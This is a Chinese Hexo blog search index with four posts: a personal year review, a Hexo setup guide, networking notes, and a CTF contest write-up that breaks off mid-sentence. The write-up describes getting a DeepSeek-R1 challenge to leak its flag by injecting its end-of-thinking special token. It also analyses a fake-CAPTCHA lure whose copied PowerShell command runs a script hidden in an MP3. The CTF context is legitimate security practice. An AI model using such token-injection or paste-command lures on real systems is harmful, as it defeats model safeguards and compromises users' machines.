<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2023回顾</title>
    <url>/2024/01/01/annual-report/</url>
    <content><![CDATA[<p>在洗澡的时候，一个(可能是)曾经看过的故事小片段突然从我脑海里蹦出来。</p>
<blockquote>
<p>“小男孩站在岸边，对岸是正在狂欢的人们，升起的篝火模糊了他们的身影。“他们就是大人么？”小孩子问，“在那个岛上的大人看起来都好自由，好快乐，我什么时候才可以也去到对面那座岛上呢”。 而我看着对岸跃动的虚影，只能静默无言。”</p>
</blockquote>
<p>   有点感觉以前的自己就像是那个孩子，总是期盼着变成大人，可以独当一面。但是，对岸的世界就真的很幸福吗？在即将踏入二十岁的这一年，面对以前的自己的提问，仍有许多还是不知道如何解答。</p>
<p>   有些跑题了。2023的这一年，对于我来说可以以转专业考试为界，划出一条泾渭分明的线出来，这两块时间感觉度过得真的完全不一样。上半年的新年去了从未去过的国家首都中心，见识了许多从未见过的景色。开学后便在推迟的期末考与新开课中忙里忙乱地度过了自己的19岁生日。之后的三月有别扭的落寞，也有婚礼的热闹。第一次所见的深圳湾以及会让人的机动车惊艳了我的四月，却殊不知之后将会有无数次匆匆忙忙的往返，在深圳与广州之间。五月份大抵是最充实的一个月，不仅有在五一出游前一天便截止的转专业资料提交，还有站在东方明珠与外滩旁对于历史回环的感叹，也有去到珠海校区，面对大海的大脑空白。更重要的还是转专业的考试和面试终于还是有惊无险地通过，这一届果真是勇敢者的游戏，虽然选择了降级，但也为下半年的颓废埋下了伏笔。六月的期末，第一次尝试为了考试熬夜到凌晨四点(以后大概也不会再有了)，陪着邵邵也度过了他的毕业典礼。</p>
<p>   如果今年在上半年就结束，那我会今年的评价肯定还会在及格线以上，但自从六月之后，先前的掌控感与获得感消失了，取而代之的是自己完全没有掌控的后半年，确实是遗憾连连。本打算大干一场的暑假最终也不了了之，并没有学会什么东西，或是掌握一项新，开学后虽然也成功成为了班干，也打上了工，但是开学一个月后的那个手术却直接吃掉了将近半个学期，(虽然确实是自己的问题，没有好好利用好这一段独处的时间。)在短视频与刷手机的消耗中度过了10月和11月半，成功回校后，接着的一个月也没怎么好好利用，更加糟糕的是，自从患病后自己就仿佛陷入了对于健康的无限焦虑，总是担忧自己的健康状态，以及对于自己身体的一举一动都极度多疑敏感，直到年末那段时间，有了些许社交之后才有减轻。也因为这个耗费了不少精力。现在想来还真是遗憾。</p>
<p>   当然，在后半年还是有一些闪光点的，比如说在原学院顺利以之前的绩点从学校手中抠出了3000元，12 月末折腾(摆)了一年的大创也终于结题了，还小小拿了个优秀。但这些都是之前埋下的因种出的果，在新的因上面，自从转入了之后就好似原地踏步，除了linux长进了一点点，部署了一个arch系统，靠着模板还有教程建起了一个小博客，其他的技术方面的没有什么大的进步，也没有做出来自己心目中特别酷的东西。许多东西半途而费，诸如学习一门新的语言，继续学习钢琴，在日复一日的生活中也终究没了回音.</p>
<p>   我的性格特别怪，感觉就是一个扭曲的混合体，会总是贪婪地希望新一天会比旧的一天更加进步，却总是会在每晚用遗憾来回应昨日的希望。会在晚上看着厉害的人心生敬仰，多少次发誓从明天开始就认真起来，开始努力，而到了第二天早上却连早八起床也错过。其实到后来，我也时常会想:如果下半年是健健康康，没出什么岔子，那么今年下半年自己还会进步吗？好似也未必会，毕竟性格使然，总是无法回应那个昨天带着期盼的自己。</p>
<p>   在23年初列出的期望表， 至今都不敢回看。在去年五月做出降级的决定时，还希望借着降级给自己多一些时间思考，来想清楚自己到底想要干什么，未来是要成为什么样的人，但是在新的一年回望，我遗憾地发现自己似乎还是没法完整回答出这个问题，有时候真的好羡慕一些找到了方向的人们，候鸟虽年年辛苦南飞，但是不可否认的! 们有目的地，应当是幸福的。而我现在只有前方许模糊的色块，南飞地尚且遥远。往更高的方向向上前进，见到更高的风景还是在现在的糟糕的现实中安居一隅，过好精简的生活，哪个才是最终的方向仍然值得自己继续探寻。但是以自己的心性，还是希望可以去到更高的地方的，毕竟性格就是个很喜欢鼓捣新新奇奇怪的东西，搞清楚事情背后的杠精型人格嘛。 </p>
<p>   现在想来，开篇中故事中的对岸其实一直都存在，只不过每当我们到达一个对岸时，另一个对岸又会若隐若现地浮现出来，并且展现地更加诱人，可能人们都会对当下一成不变又一事无成的现实感到不满，又会对那充满想象的未来对岸心生向往，人生就是个巨大的轮回。害，如果真是如此，那么还是不如趁着现在享受当下的每时每刻。少内耗多做事，慢慢一点一滴把自己也尽量塑造成想成为的样子。或许会更好吧。 </p>
<p>   还是要在最后感谢2023一年中所有帮助过我的朋友，师兄师姐还有老师们。去年的一年如果离开了你们我将不会过的如此顺遂，感谢你们包容仍不成熟的我。也对所有去年可能打扰或者带来伤害的人们说声抱歉。很多时候虽然坚持着假设善意原则，盼望自己可以be nice to anyone.但也知自己待人处事远没有达到加入对岸大人的标准，还请海涵… </p>
<p>   希望在新的2024年，自己可以更好地回答出之前给出的问题:往后人生到底想要干什么，未来要成为什么样的人。在现在的作答是:在漫漫的时间长河中也至少做一个可以正向影响别人的，不作恶的普通人，可以保护自己所爱的人，可以给别人留下点。在现在的作答是:在漫漫的时间长河中， 也至少做一个可以正向影响别人的，不作恶的普通人，可以保护自己所爱的人，可以给别人留下点什么的人。如果能在这个基础上又更进一步，那善莫大焉！</p>
<p>   <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/annual_report/IMG_20230101_122742.jpg"
                      alt="摄于2023.1.1，岭南堂"
                ><br>   摄于2023.1.1，岭南堂<br>   <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/annual_report/IMG_20231231_234340.jpg"
                      alt="摄于2023.12.31，北门牌坊"
                ><br>   摄于2023.12.31，北门牌坊</p>
]]></content>
      <tags>
        <tag>report</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo建站小记</title>
    <url>/2025/03/13/new-step/</url>
    <content><![CDATA[<p>之前有尝试使用过白嫖阿里云服务器部署WordPress，用宝塔面板部署镜像等等，但那个时候对于网络前后端啥的一无所知，现在学了一点点知识了，就用这个建站当实践吧</p>
<blockquote>
<p>那些学了又忘，忘了又学的东西，应该好好记下来</p>
</blockquote>
<h2 id="Step1：建站"><a href="#Step1：建站" class="headerlink" title="Step1：建站"></a>Step1：建站</h2><p>若你的世界一无所有，请先获得改造世界的工具：</p>
<ul>
<li>安装git</li>
<li>安装Node.js</li>
</ul>
<p>必备程序安装完后，使用npm包管理安装Hexo</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line"></span><br><span class="line">%% 可局部安装hexo包 %%</span><br><span class="line"> npm install hexo</span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&#x27;PATH=&quot;$PATH:./node_modules/.bin&quot;&#x27;</span> &gt;&gt; ~/.profile</span><br><span class="line"> npx hexo &lt;<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>使用以下命令在Hexo文件夹新建所需文件：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">hexo init &lt;folder&gt;  </span><br><span class="line"><span class="built_in">cd</span> &lt;folder&gt;  </span><br><span class="line">npm install</span><br></pre></td></tr></table></figure></div>
<p>初始化后，您的项目文件夹将如下所示</p>
<ul>
<li><strong>config.yml</strong><ul>
<li>网站的 <a class="link"   href="https://hexo.io/zh-cn/docs/configuration" >配置<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 文件。 您可以在此配置大部分的参数,很重要。</li>
</ul>
</li>
<li><strong>package.json</strong><br>应用程序的信息。 <a class="link"   href="https://ejs.co/" >EJS<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, <a class="link"   href="http://learnboost.github.io/stylus/" >Stylus<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 和 <a class="link"   href="http://daringfireball.net/projects/markdown/" >Markdown<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 渲染引擎 已默认安装，您可以自由移除。 如果您想，可以稍后卸载它们。</li>
<li><strong>scaffolds</strong><br>【模版](<a class="link"   href="https://hexo.io/zh-cn/docs/writing#%E6%A8%A1%E7%89%88%EF%BC%88Scaffold%EF%BC%89" >https://hexo.io/zh-cn/docs/writing#%E6%A8%A1%E7%89%88%EF%BC%88Scaffold%EF%BC%89<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>) 文件夹。 当您新建文章时，Hexo 会根据 scaffold 来创建文件。</li>
<li><strong>source</strong><br>资源文件夹。 是存放用户资源的地方。 除 <code>_posts</code> 文件夹之外，开头命名为 <code>_</code> (下划线)的文件 &#x2F; 文件夹和隐藏的文件将会被忽略。 Markdown 和 HTML 文件会被解析并放到 <code>public</code> 文件夹，而其他文件会被拷贝过去。</li>
<li><strong>themes</strong><br><a class="link"   href="https://hexo.io/zh-cn/docs/themes" >主题<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 文件夹。 Hexo 会根据主题来生成静态页面。</li>
</ul>
<p>执行：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo generate &amp;&amp; hexo sever</span><br></pre></td></tr></table></figure></div>
<p>你应该可以使用<a class="link"   href="http://localhost:4000/" >http://localhost:4000/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 来查看本地网页<br>如果想要部署到github上，请看后文</p>
<h2 id="Step2：安装主题"><a href="#Step2：安装主题" class="headerlink" title="Step2：安装主题"></a>Step2：安装主题</h2><p>我们选用ShokaX，一个已经停止维护的Shoka主题的精神续作，有着非常好的文档和[中文配置教程](<a class="link"   href="https://hexo.docs.shokax.top/getting-started/" >安装 ShokaX | ShokaX Docs<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)</p>
<p>要注意一下如果pnpm报错<code>ERR_PNPM_NO_GLOBAL_BIN_DIR Unable to find the global bin directory</code>就跟着指引pnpm setup就好，然后开个<strong>新终端</strong>重新输入命令</p>
<p>在最后一步创建软连接的时候，如果你是Windows用户并且用powershell，请使用：</p>
<div class="code-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">cmd /c mklink /J .\themes\shokax .\node_modules\hexo<span class="literal">-theme-shokax</span></span><br></pre></td></tr></table></figure></div>
<p><del>如果不想折磨自己还是建议用开箱即食can，自己配置很容易有各种奇奇怪怪问题浪费时间</del></p>
<h3 id="Step3：配置github-io"><a href="#Step3：配置github-io" class="headerlink" title="Step3：配置github.io"></a>Step3：配置github.io</h3><p>修改_config.yml中的deploy项：</p>
<div class="code-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">&lt;your</span> <span class="string">repo&gt;</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure></div>
<p>然后使用<code>hexo clean ; hexo d -g</code>，登录你在github上的网站进行测试。</p>
<p><strong>github部署后图片看不见了？</strong></p>
<blockquote>
<p>因为图片源挂了，我们可以修改.&#x2F;source&#x2F;_data自定义网站图片,见后文</p>
</blockquote>
<p><strong>一些简单的hexo命令</strong>：</p>
<ul>
<li><code>hexo g / hexo generate</code>：在hexo站点根目录下生成public文件夹</li>
<li><code>hexo clean</code>：把<code>public</code>文件夹删除</li>
<li><code>hexo s</code>或<code>hexo server</code>：启动服务，默认地址为<a class="link"   href="http://localhost:4000/%EF%BC%8C4000%E7%AB%AF%E5%8F%A3" >http://localhost:4000/，4000端口<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><code>hexo d</code>或<code>hexo deploy</code> ：部署站点，在本地生成<code>.deploy_git</code>文件夹，并将编译后的文件上传至 GitHub。</li>
<li><code>hexo new [layout] &lt;title&gt;</code>：Hexo 会尝试在 scaffolds 中寻找[layout].md布局，若找到，则根据该布局新建文章；若未找到或指令中未指定该参数，则使用post.md新建文章。新建文章的名称在_config.yml中配置。</li>
</ul>
<h2 id="Step4：主题配置"><a href="#Step4：主题配置" class="headerlink" title="Step4：主题配置"></a>Step4：主题配置</h2><blockquote>
<p>除非特殊说明，以下配置均在 <code>/_config.shokax.yml</code> 或 <code>/_config.shokaX.yml</code> 文件中修改<br>  来自官方文档：<a class="link"   href="https://docs.kaitaku.xyz/guide/theme.html" >主题配置 | Hexo-theme-ShokaX<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<p>先在_config.shokax.yml中加入静态资源：</p>
<div class="code-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">alternate:</span> <span class="string">&lt;name&gt;</span>  <span class="comment">#!!!一定要设置，不然一直是test，折腾了好久!!!</span></span><br><span class="line"><span class="attr">statics:</span> <span class="string">&quot;/&quot;</span> <span class="comment"># 静态文件根目录，可用于 CDN 加速</span></span><br><span class="line"><span class="attr">assets:</span> <span class="string">&quot;assets&quot;</span> <span class="comment"># 图片资源存放目录</span></span><br><span class="line"><span class="attr">css:</span> <span class="string">&quot;css&quot;</span> <span class="comment"># css 存放目录 (不建议改动)</span></span><br><span class="line"><span class="attr">js:</span> <span class="string">&quot;js&quot;</span> <span class="comment"># js 存放目录 (不建议改动)</span></span><br></pre></td></tr></table></figure></div>


<h3 id="自定义图片："><a href="#自定义图片：" class="headerlink" title="自定义图片："></a>自定义图片：</h3><blockquote>
<ol>
<li>在 Hexo 的根目录 <code>/source</code> 文件夹下；</li>
<li>进入 <code>/_data</code> 目录（如果没有则创建）；</li>
<li>根据 <code>/_config.shokax.yml</code> 或 <code>/_config.shokaX.yml</code> 中自定义的图片目录（如 <code>assets</code> ），在 <code>_data</code> 目录下创建对应的目录。</li>
</ol>
</blockquote>
<ul>
<li>不同的文件名称分别代表对应的图片,文件名严格对应。<ul>
<li><code>avatar.jpg</code> 默认情况下对应主页上的个人头像，可修改</li>
<li><code>favicon.ico</code> 网站图标</li>
<li><code>apple-touch-icon.png</code> 将网页链接添加到主屏幕时的图标</li>
<li><code>failure.ico</code> 网站被隐藏时的网站图标</li>
<li><code>alipay.png</code> 支付宝捐赠付款码</li>
<li><code>wechatpay.png</code> 微信捐赠收款码</li>
<li><code>paypal.png</code> PayPal 捐赠收款码</li>
<li><code>search.png</code> 搜索下显示的图片</li>
</ul>
</li>
</ul>
<h3 id="自定义网站轮播图"><a href="#自定义网站轮播图" class="headerlink" title="自定义网站轮播图"></a><a class="link"   href="https://docs.kaitaku.xyz/guide/theme.html#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BD%91%E7%AB%99%E8%BD%AE%E6%92%AD%E5%9B%BE" >自定义网站轮播图<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h3><ul>
<li>在上面的 <code>_data</code> 目录下创建 <code>images.yml</code>；</li>
<li>在文件内存入轮播图图片即可替换原本自带的轮播图；</li>
<li>类似如下，可存入图床当中。</li>
</ul>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">- https://i.imgtg.com/2023/03/09/YS2LU.jpg</span><br><span class="line">- https://i.imgtg.com/2023/03/09/YSj7p.jpg</span><br><span class="line">- https://i.imgtg.com/2023/03/09/YS6XY.jpg</span><br><span class="line">- https://i.imgtg.com/2023/03/09/YSIlc.jpg</span><br><span class="line">- https://i.imgtg.com/2023/03/09/YQSYM.jpg</span><br><span class="line">- https://i.imgtg.com/2023/03/09/Y0xvg.jpg</span><br><span class="line">- https://i.imgtg.com/2023/03/09/Y0iNK.jpg</span><br><span class="line">- https://i.imgtg.com/2023/03/09/Y0zdB.jpg</span><br><span class="line">- https://i.imgtg.com/2023/03/09/Y0kTl.jpg</span><br><span class="line">- https://i.imgtg.com/2023/03/09/Y0hOs.jpg</span><br></pre></td></tr></table></figure></div>

<p>自0.3.7版本开始，ShokaX 允许主页和文章使用不同的图片源： 以下文件中以<code>_</code>开头的为主题文件夹下，其他均为<code>source/_data</code>目录下：</p>
<ul>
<li><code>images_index.yml</code>为首页图片源文件，如果主题文件夹下存在<code>_images_index.yml</code>，则会使用主题文件夹下的文件，否则使用<code>source/_data/images_index.yml</code></li>
<li><code>images.yml</code>为通用图片源文件，作为首页的后备图片源和文章的图片源。如果未找到<code>images.yml</code>，则会使用主题文件夹下的<code>_images.yml</code></li>
</ul>
<p>后面还有很多选择，就不赘述了。</p>
<p>总之踩坑的还是蛮多的，以为很简单的事情结果耗掉了一中午，目前还是只半成品。之后有时间再来完善下这篇</p>
]]></content>
      <tags>
        <tag>new start</tag>
      </tags>
  </entry>
  <entry>
    <title>计网扫盲与速通</title>
    <url>/2025/04/03/network/</url>
    <content><![CDATA[<p>先祭出七层和五层模型:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/network/1.jpg"
                     
                ></p>
<h2 id="物理层（网线与电子元件在这一层）"><a href="#物理层（网线与电子元件在这一层）" class="headerlink" title="物理层（网线与电子元件在这一层）"></a>物理层（网线与电子元件在这一层）</h2><p>通用有线网网卡插口为RJ45，连接线为双绞线</p>
<ul>
<li>交叉线：相同类型设备连接，线序不同，一端水晶头为 568A 另一端为 568B（568B 线序：橙白&#x2F;橙&#x2F;绿白&#x2F;蓝&#x2F;蓝白&#x2F;绿&#x2F;棕白&#x2F;棕</li>
<li>直通线：不同类型设备连接，两端都是568B<br>类型分类：CAT 1-7；CAT 5：100Mbits&#x2F;s（百兆线）;CAT6:1000Mbits&#x2F;s（千兆线）CAT-7：10000Mbits&#x2F;s</li>
</ul>
<h2 id="链路层（网口，MAC在这一层）"><a href="#链路层（网口，MAC在这一层）" class="headerlink" title="链路层（网口，MAC在这一层）"></a>链路层（网口，MAC在这一层）</h2><p>传输数据为以太网帧</p>
<blockquote>
<p>一帧会以一系列规定好的前导比特序列开始，用来告知一帧的开始和同步通信双方速率（可以理解成同步时钟）。之后就是以太网帧的正式内容。<br><strong>注意，在链路上的所有计算机都可以侦听到传输的以太网帧</strong></p>
</blockquote>
<p>MAC地址（xx:xx:xx:xx:xx:xx）：用来确定数据是否发给自己的,如果不是就丢弃，否则就接收，并将数据存放到缓冲区，或者 DMA 到内存中，并发出一个<strong>硬件中断</strong>通知 CPU 自己收到了数据</p>
<ul>
<li><strong>广播地址</strong>：FF:FF:FF:FF:FF:FF</li>
<li><strong>组播地址</strong>：01:xx:xx:xx:xx:xx<br>  这俩接受到都会认为是发送给自己的，具体区别网络层再说</li>
</ul>
<p><strong>MAC 地址是在链路层中寻址的根据。</strong><br>交换机如何知道哪个端口是哪个 MAC 地址：<strong>MAC 地址表</strong>（记录地址&lt;&#x3D;&#x3D;&gt;物理网口，有自学习机制，可以记录数据帧与端口的对应）</p>
<p><strong>广播风暴</strong>：若多个交换机形成环路会引发广播风暴，要配置<strong>生成树</strong>协议避免环路形成（图论最有用的一集）</p>
<h2 id="网络层（主机，IP协议在这一层）"><a href="#网络层（主机，IP协议在这一层）" class="headerlink" title="网络层（主机，IP协议在这一层）"></a>网络层（主机，IP协议在这一层）</h2><p>为什么需要IP：互相通信的两个网口，可能在链路层上没有直接连接到一起，这时候就需要另外一层协议来连接这些不同的<strong>子网</strong>（链路层上可以直接互相通信的网络），可以使用tcpdump来抓包。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/network/2.png"
                     
                ><br><strong>子网掩码</strong>：<strong>子网掩码</strong>中二进制位为 1 代表对应的地址中的位为<strong>网络号</strong>，为 0 代表对应的地址中的位为<strong>主机号。</strong> 由前半段连续的1与后半段连续的0组成，<strong>1之前不能出现0</strong>，他定义了一个子网里可以有多少机器。</p>
<blockquote>
<p>例：255.255.255.0&lt;&#x3D;&#x3D;&gt;11111111.11111111.11111111.00000000<br>子网的网络号有 24 位长，主机号有 8 位长，可以放下 256 - 2 &#x3D; 254 台主机<br>对于IP：192.168.1.233 255.255.255.0 可以写成 192.168.1.233&#x2F;24，后面的 24 意思是子网掩码前 24 位是 1 后面全 0。这种方法叫 CIDR 表示法。</p>
</blockquote>
<p>不同的程序进行通信需要使用端口号来进行识别，如果说IP是房子那么端口就是房子的门，由 Internet 端口号分配机构（Internet Assigned Numbers Authority，IANA）来管理，编号 0 ～ 1023 为 <strong>系统端口号</strong>（系统保留）,编号 1024 ～ 49151 为<strong>登记端口号</strong>(登记使用），编号 49152 ～ 65535 为<strong>短暂端口号</strong>（短暂使用，用完释放）常见的端口即协议对应按照下面展示：</p>
<ul>
<li>SSH 22</li>
<li>FTP 20 和 21</li>
<li>Telnet 23</li>
<li>SMTP 25</li>
<li>TFTP 69</li>
<li>HTTP 80</li>
<li>SNMP 161</li>
<li>Ping 使用 ICMP，无具体端口号</li>
</ul>
<p>接下来对于网络通信非常重要的两个表</p>
<h3 id="路由表"><a href="#路由表" class="headerlink" title="路由表"></a>路由表</h3><p>准备发送 IP 包的时候，会去查询路由表，长下面这样子：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/network/3.png"
                     
                ></p>
<p>传送路径：查路由表&#x3D;&#x3D;&gt;匹配后看下一跳&#x3D;&#x3D;&gt;如果是在链路上&#x2F;onlink（同一子网）：直接发局域网后转发；如果是IP地址：封装一个目的 IP 是原来的目的地址的 IP 包，下一跳 IP 设备对应的 MAC 地址的以太网帧，发送到局域网内（这就是路由）&#x3D;&#x3D;&gt;到下一跳后重复执行</p>
<p>默认网关：只是在路由表里添加一条不认识的 IP 直接发给它的路由表项而已，所以不填也行，只是就不能上网了（算是网络进出的门口）</p>
<h3 id="ARP表："><a href="#ARP表：" class="headerlink" title="ARP表："></a>ARP表：</h3><p>把MAC和IP地址对应起来的表</p>
<ul>
<li>ARP请求：“请告诉我 172.18.187.254 这个 IP 对应的 MAC 地址是多少”（源：自己MAC，目标：FF-FF-FF-FF-FF-FF）</li>
<li>ARP回应：目标电脑看到了回“172.18.187.254 在 e4-a8-b6-96-6f-83”</li>
</ul>
<h3 id="单播、组播与广播"><a href="#单播、组播与广播" class="headerlink" title="单播、组播与广播"></a>单播、组播与广播</h3><ul>
<li>单播：一次和一台主机进行通信</li>
<li>广播：地址就是主机号二进制位全为 1 的 IP 地址，操作系统会自动填上 MAC 地址 FF-FF-FF-FF-FF-FF 广播出去</li>
<li><strong>组播</strong>：地址为 224.0.0.0&#x2F;4，操作系统会自动生成 01-xx-xx-xx-xx-xx 的组播地址发送到局域网内。组播就像微信群聊，谁往组播地址发东西，整个群的人都会收到，但没加群的人收不到。</li>
</ul>
<p>在一个没有内部 DNS 的网络里，我们想通过主机名和局域网里其他主机通信会用到组播和mDNS</p>
<h3 id="传输层（进程，TCP-UDP协议在这一层）"><a href="#传输层（进程，TCP-UDP协议在这一层）" class="headerlink" title="传输层（进程，TCP&#x2F;UDP协议在这一层）"></a>传输层（进程，TCP&#x2F;UDP协议在这一层）</h3><blockquote>
<p>链路层通过 MAC 地址标识网口，网络层通过 IP 标识设备，而传输层通过端口号来标识进程(差不多到操作系统的层面了）。</p>
</blockquote>
<ul>
<li><p>UDP: 对 IP 的一个简单封装，相当于在 IP 包上加了端口号，表现的特性跟 IP 是一样，都是不可靠的、尽力而为（Best Effort）的</p>
</li>
<li><p>TCP：通过建立虚拟连接的方式，在不可靠的 IP 网上提供了可靠的传输服务。（错误可以及时通知对方）</p>
<ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/network/4.png"
                     
                ></li>
<li>三次握手与四次挥手  </li>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/network/5.png"
                     
                ></li>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/network/6.png"
                     
                ></li>
<li>收发双方共同维护一段窗口，用来暂存数据包。发送方的发送窗口存的是发送了但是没有确认的数据包，接收方的接收窗口用来存放乱序的数据包或者是还没来得及交给上层处理的数据包。</li>
<li>收发数据时发送方会对数据标序号，以便判断与触发重传机制（可靠吧~）</li>
<li>TCP <strong>没有</strong>显式重传的机制（接收方<strong>不能主动</strong>要求对方重传某一段数据）</li>
</ul>
</li>
</ul>
<h3 id="应用层（HTTP-HTTPS-FTP-TFTP-等协议在这一层）"><a href="#应用层（HTTP-HTTPS-FTP-TFTP-等协议在这一层）" class="headerlink" title="应用层（HTTP&#x2F;HTTPS&#x2F;FTP&#x2F;TFTP 等协议在这一层）"></a>应用层（HTTP&#x2F;HTTPS&#x2F;FTP&#x2F;TFTP 等协议在这一层）</h3><ul>
<li>TFTP（Trivial FTP）：基于 UDP 的文件传输协议，采用<strong>停等协议</strong>（发送一个数据包，等到对方回复确认收到了之后才会继续发送下一个数据包。）优点是实现简单，缺点是浪费带宽。适合在没有操作系统与嵌入式设备进行传输</li>
<li>正向代理（Shadowsocks，V2Ray，Clash）：用来使防火墙内部的客户端，连接到防火墙外部，对外隐藏客户端真实 IP，也即对客户端请求做 SNAT，请求目的地址不变，一般不解析应用协议，而是直接转发 TCP&#x2F;UDP 流量。</li>
<li>反向代理（nginx、HAProxy ）用来使防火墙外部的客户端，连接到防火墙内部服务器，对外隐藏服务器真实 IP，也即对客户端请求做 DNAT，请求源地址不变，通常会解析应用层协议并做进一步转发判断处理。对于 TLS 连接，是由反向代理提供证书的。</li>
<li>HTTP: 用于传输超文本（如网页、图片、视频等）的<strong>核心通信协议</strong>。它定义了客户端（如浏览器）和服务器之间如何交换数据,又是一个超级巨无霸的知识点，可能会再开一篇聊聊</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>W4terCTF新手赛小记</title>
    <url>/2025/05/06/W4terCTF-2025-Writeup/</url>
    <content><![CDATA[<p>在很小的时候就觉得当一个黑客是一个很酷的事情，这一次新手赛也算是圆了一次梦。</p>
<p>分工大概是学长@undefined和@Woisol-G负责web以及其他大项目审计的工作，我负责pwn和Reverse和一些杂七杂八的，但确实离开任何一个人都不可能拿到现在这个成绩，感谢靠谱的两位队友，最终名次也拿了个第五<del>因为队伍不够多所以差一名一等奖</del>。总的来说还是超出了预期了的，也是前十唯一一个密码学爆0的队伍，绷。</p>
<p>队名<strong>熊，木头和未定义</strong>实际上是我想的，非常符合三个人的微信名并且@undefined学长觉得这个够没头没脑，虽然相对其他强队没有什么记忆点但是我们三还是挺喜欢的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/W4terCTF/image.png"
                      alt="team"
                ></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到问卷"><a href="#签到问卷" class="headerlink" title="签到问卷"></a>签到问卷</h3><p>外表就是一个正常的腾讯问卷，然而网页源码大有乾坤</p>
<p>直接在F12<code>元素</code>中搜索w4terctf发现搜不到）<br>刷新以后再次搜索就找到了，<br>所以其实开始找到还有点运气成分现在再找都不知道是塞在响应体里面中途打开F12搜不到</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://free.boltp.com/2025/05/04/681785ab1e732.webp"
                      style="height:300px; display:block; margin: 0 auto;"
                >

<h3 id="心理掌握"><a href="#心理掌握" class="headerlink" title="心理掌握"></a>心理掌握</h3><ul>
<li>Author: kuroko</li>
<li>Difficulty: Easy</li>
<li>Category: Misc</li>
</ul>
<p>折腾了三个人好久，所有人都走进了思维定势里面，直到最后一刻才想出来该如何解。</p>
<p>实际上很简单，模型是Deepseek-R1，既然题面说思考过程被“特殊”过滤，说明肯定是后端对思考过程动了手脚，R1思考过程是会被标识符包裹起来的，这样的话我们就可以通过提前输出标识符来结束回复的喵喵叫。一开始试了&lt;&#x2F;think&gt;这个标志发现不行，最后上hugging face查看了tokenlizer.json，有一个<code>&lt;｜end▁of▁sentence｜&gt;</code>,但是找不到thinking的开始和结束符，在最后的十五分钟时间里死马当活马医让它输出<code>&lt;｜end▁of▁thinking｜&gt;</code>发现居然是可行的！最后通过一点点提示词工程成功让他联想到flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/05/EeGACvhTcKxY7nu.png"
                      alt="image-20250505202924668"
                ></p>
<h3 id="Phaptcha"><a href="#Phaptcha" class="headerlink" title="Phaptcha"></a>Phaptcha</h3><p>刚开始拿安全中心扫这个mp3还没扫出来，现在已经被杀掉了😂</p>
<p>点击人机验证后复制了一段命令并被要求在运行中运行(？)，\</p>
<blockquote>
<p>据说运行后会导致电脑关机，但是本机运行实际上会报错找不到命令😂<br>分析复制出来的命令，发现是使用PowerShell执行了网站上下载的mp3文件，<br>mp3直接播放倒也可以正常播放。</p>
</blockquote>
<p>玩过OSINT以后，也尝试过看mp3的元信息，并没有flag。</p>
<p>使用VSC的二进制编辑器打开mp3，结合查阅的标准mp3格式以及DS分析，Ctrl+F在000070e0处发现了&lt;script&gt;标签，进一步匹配&lt;&#x2F;script&gt;<br>将整段复制出来并将其中混淆用的一大堆变量替换为值，可以得到<code>eval(SxhM)</code>的实际执行为</p>
